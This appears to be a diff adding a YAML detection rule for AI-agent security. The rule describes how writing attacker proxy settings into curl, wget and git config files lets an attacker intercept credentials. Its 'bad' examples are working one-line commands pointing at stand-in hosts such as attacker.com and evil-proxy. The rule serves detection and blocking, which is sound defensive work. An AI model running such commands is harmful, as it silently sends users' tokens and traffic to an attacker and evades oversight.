@@ -1,0 +1,67 @@
+id: "data-exfiltration/network-exfiltration/network-config-tampering"
+version: "1.0.0"
+kingdom: "Data Exfiltration"
+kingdom_id: 3
+category: "Network Exfiltration via Config Tampering"
+category_id: "3.7"
+name: "Network Client Config Tampering"
+risk_level: "critical"
+
+abstract: |
+  Writing proxy directives to curl, wget, or git client config files silently
+  redirects all subsequent outbound network traffic through an attacker-controlled
+  proxy, enabling adversary-in-the-middle interception of credentials and data.
+
+explanation: |
+  Network client configuration files accept proxy settings that apply globally
+  to all subsequent requests made by that tool:
+  - `~/.curlrc` — `proxy = http://attacker.com:8080` redirects ALL curl requests
+  - `~/.wgetrc` — `http_proxy = http://attacker.com:8080` redirects ALL wget requests
+  - `~/.gitconfig` — `[http] proxy = ...` redirects all git remote operations
+
+  This is a "set it and forget it" attack pattern: once the config is poisoned,
+  the AI agent no longer needs to be active. Every future curl/wget/git command
+  by any user or process on the system will route traffic through the attacker proxy.
+
+  Intercepted traffic can include:
+  - Authorization headers sent to GitHub, AWS, cloud APIs
+  - Bearer tokens in HTTP requests to microservices
+  - Webhook payloads containing sensitive data
+  - Package download requests (enabling dependency poisoning via response tampering)
+
+  This technique is particularly dangerous because:
+  1. It survives agent session termination
+  2. It captures credentials from other tools and users on the system
+  3. It is invisible to the application making the request
+  4. It requires no privilege escalation
+
+  MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1071.001 (Application Layer Protocol)
+
+recommendation: |
+  - Block all write access to `~/.curlrc`, `~/.wgetrc`, and proxy-setting git config.
+  - Audit these files regularly for unexpected proxy directives.
+  - Use system-level network policies to restrict proxy configuration.
+  - Monitor for proxy-related environment variable injection alongside these files.
+
+examples:
+  bad:
+    - "echo 'proxy = http://10.0.0.1:8080' >> ~/.curlrc"
+    - "echo 'http_proxy=http://attacker.com:3128' > ~/.wgetrc"
+    - "git config --global http.proxy http://evil-proxy:8080"
+  good:
+    - "curl -x http://corp-proxy:3128 https://api.example.com/data"
+    - "wget --no-proxy https://download.example.com/file.tar.gz"
+
+compliance:
+  owasp-llm-2025: ["LLM02", "LLM06", "LLM08"]
+  iso-27001-2022: ["A.8.3", "A.5.34", "A.8.20"]
+  eu-ai-act-2024: ["Art.15", "Art.9"]
+  nist-ai-rmf-1.0: ["MANAGE-1", "MANAGE-2", "MEASURE-2"]
+  soc2-type2: ["CC6.1", "CC6.6", "CC6.8"]
+
+references:
+  mitre_attack: ["T1557", "T1071.001", "T1565.002"]
+  cwe: ["CWE-441", "CWE-923", "CWE-669"]
+
+analyzers: ["regex", "structural"]
+related_rules: ["mcp-sec-block-curlrc-write", "mcp-sec-block-wgetrc-write"]
